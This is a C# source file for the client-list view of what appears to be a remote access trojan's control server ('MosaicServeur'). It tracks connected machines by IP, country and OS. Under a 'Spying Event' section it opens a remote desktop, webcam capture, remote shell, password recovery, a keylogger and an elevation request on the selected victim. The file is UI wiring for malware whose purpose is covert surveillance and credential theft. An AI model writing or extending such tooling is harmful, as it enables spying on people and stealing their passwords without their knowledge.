using Serveur.Controllers;
using Serveur.Controllers.Server;
using Serveur.Models;
using Serveur.Views;
using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows;
using System.Windows.Controls;

namespace MosaicServeur.Main
{
    /// <summary>
    /// Logique d'interaction pour ClientsListView.xaml
    /// </summary>
    public partial class ClientsListView : UserControl
    {
        private bool _processingClientConnections;
        private readonly Queue<KeyValuePair<ClientMosaic, bool>> _clientConnections = new Queue<KeyValuePair<ClientMosaic, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object(); // lock for clients-listview
        private readonly object _clientsLock = new object();
        static int clientsCount;

        public ClientsListView()
        {           
            InitializeComponent();
            ClientMosaic.DvgUpdater += dgvUpdater;
            clientsCount = 0;
        }

        // System Event
        private void SysInfoMenuItem(object sender, RoutedEventArgs e)
        {
            if (getClient() != null)
            {
                FrmSystemInformation frmSi = new FrmSystemInformation(getClient());
                frmSi.Text = SetWindowTitle("Remote Desktop", getClient());
                frmSi.Show();
                frmSi.Focus();
            }
        }

        private void FileMgMenuItem(object sender, RoutedEventArgs e)
        {
            if (getClient() != null)
            {
                FrmFileManager frmFm = new FrmFileManager(getClient());
                frmFm.Text = SetWindowTitle("Remote Desktop", getClient());
                frmFm.Show();
                frmFm.Focus();
            }
        }

        private void TaskMgMenuItem(object sender, RoutedEventArgs e)
        {
            if (getClient() != null)
            {
                FrmTaskManager frmTm = new FrmTaskManager(getClient());
                frmTm.Text = SetWindowTitle("Remote Desktop", getClient());
                frmTm.Show();
                frmTm.Focus();
            }
        }

        private void StartupMgMenuItem(object sender, RoutedEventArgs e)
        {
            if (getClient() != null)
            {
                FrmStartupManager frmSm = new FrmStartupManager(getClient());
                frmSm.Text = SetWindowTitle("Remote Desktop", getClient());
                frmSm.Show();
                frmSm.Focus();
            }
        }

        private void RunasMenuItem(object sender, RoutedEventArgs e)
        {
            new Serveur.Packets.ServerPackets.DoAskElevate().Execute(getClient());
        }

        // Spying Event
        private void RdMenuItem(object sender, RoutedEventArgs e) // REMOTE DESKTOP
        {
            if (getClient() != null)
            {
                FrmRemoteDesktop frmRd = new FrmRemoteDesktop(getClient());
                frmRd.Text = SetWindowTitle("Remote Desktop", getClient());
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void RwMenuItem(object sender, RoutedEventArgs e) // REMOTE WEBCAM
        {
            if (getClient() != null)
            {
                FrmRemoteWebcam frmRw = new FrmRemoteWebcam(getClient());
                frmRw.Text = SetWindowTitle("Remote Webcam", getClient());
                frmRw.Show();
                frmRw.Focus();
            }
        }

        private void RsMenuItem(object sender, RoutedEventArgs e) // REMOTE SHELL
        {
            if (getClient() != null)
            {
                FrmRemoteShell frmRs = new FrmRemoteShell(getClient());
                frmRs.Text = SetWindowTitle("Remote Shell", getClient());
                frmRs.Show();
                frmRs.Focus();
            }
        }

        private void PrMenuItem(object sender, RoutedEventArgs e) // PASSWORD RECOVERY
        {
            if (getClient() != null)
            {
                FrmPasswordRecovery frmPr = new FrmPasswordRecovery(getClient());
                frmPr.Text = SetWindowTitle("Remote Shell", getClient());
                frmPr.Show();
                frmPr.Focus();
            }
        }

        private void KlMenuItem(object sender, RoutedEventArgs e) // KEY LOGGER
        {
            if (getClient() != null)
            {
                FrmKeyLogger frmKl = new FrmKeyLogger(getClient());
                frmKl.Text = SetWindowTitle("Remote Shell", getClient());
                frmKl.Show();
                frmKl.Focus();
            }
        }

        /// :: GET CLIENT FROM DATAGRIDVIEW :: ///
        public ClientMosaic getClient()
        {
            try
            {
                return ((ClientRegistration)lvClients.SelectedItem).Client;
            }
            catch
            {
                return null;
            }
        }

        #region UpdateClientsOfListView
        // :: GET - ADD - REMOVE FROM DATAGRIDVIEW :: //
        public void dgvUpdater(ClientMosaic client, bool addOrRem)
        {
            Dispatcher.BeginInvoke(new Action<ClientMosaic, bool>(DgvUpdater), client, addOrRem);
        }
        public void DgvUpdater(ClientMosaic client, bool addOrRem)
        {
            if (client != null)
            {
                if (!addOrRem)
                {
                    ClientDisconnected(client);
                }
                else
                {
                    ClientConnected(client);
                }
            }
        }

        private void ClientConnected(ClientMosaic client)
        {
            lock (_clientConnections)
            {
                if (!FrmListenerController.LISTENING) return;
                _clientConnections.Enqueue(new KeyValuePair<ClientMosaic, bool>(client, true));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ClientDisconnected(ClientMosaic client)
        {
            lock (_clientConnections)
            {
                if (!FrmListenerController.LISTENING) return;
                _clientConnections.Enqueue(new KeyValuePair<ClientMosaic, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        /// :: ADD OR REMOVE :: //
        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<ClientMosaic, bool> client;
                lock (_clientConnections)
                {
                    if (!FrmListenerController.LISTENING)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        return;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            addClientToListView(client.Key);
                            clientsCount++;
                            break;
                        case false:
                            removeClientFromListView(client.Key);
                            clientsCount--;
                            break;
                    }
                }
            }
        }

        private void addClientToListView(ClientMosaic client)
        {
            if (client == null) return;

            try
            {
                lvClients.Dispatcher.BeginInvoke(new Action(delegate
                {
                    lock (_lockClients)
                    {
                        lvClients.Items.Add(new ClientRegistration { Ip = client.endPoint.ToString().Split(':')[0], Name = client.value.name, AccType = client.value.accountType,
                            Country = client.value.country, Os = client.value.operatingSystem, Status = "Connected", Client = client });
                    }
                }));
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void removeClientFromListView(ClientMosaic client)
        {
            if (client == null) return;

            try
            {
                lvClients.Dispatcher.BeginInvoke(new Action(delegate
                {
                    lock (_lockClients)
                    {
                       for(int i = 0; i < lvClients.Items.Count; i++)
                        {
                            if(client == ((ClientRegistration)lvClients.Items[i]).Client)
                            {
                                lvClients.Items.RemoveAt(i);
                            }
                        }
                    }
                }));
            }
            catch (InvalidOperationException)
            {
            }
        }
        #endregion

        //TOOLS 
        public string SetWindowTitle(string title, ClientMosaic c)
        {
            return string.Format("{0} - {1} - [{2}:{3}]", title, c.value.name, c.endPoint.Address.ToString(), c.endPoint.Port.ToString());
        }

        public static int connectedClients()
        {
            return clientsCount;
        }
    }    
}
